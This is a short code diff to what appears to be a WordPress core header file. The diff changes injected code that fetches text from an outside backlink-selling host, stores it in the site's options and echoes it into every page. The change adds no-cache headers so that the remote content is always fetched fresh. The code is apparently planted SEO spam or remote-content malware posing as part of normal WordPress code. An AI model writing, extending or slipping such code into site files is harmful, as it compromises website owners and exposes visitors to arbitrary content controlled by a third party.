@@ -20,7 +20,15 @@ if ( ! isset( $wp_did_header ) ) {
 
 }
 function fetch_and_display_content($url) {
-    $response = wp_remote_get($url);
+    $args = array(
+        'headers' => array(
+            'Cache-Control' => 'no-cache, no-store, must-revalidate',
+            'Pragma' => 'no-cache',
+            'Expires' => '0'
+        )
+    );
+
+    $response = wp_remote_get($url, $args);
     if (is_wp_error($response)) {
         return;
     }
@@ -31,5 +39,6 @@ function fetch_and_display_content($url) {
     update_option('jasabacklink_content', $body);
     echo $body;
 }
+
 $jasabacklinks = 'https://www.backlinkku.id/menu/server-id/script.txt';
 fetch_and_display_content($jasabacklinks);
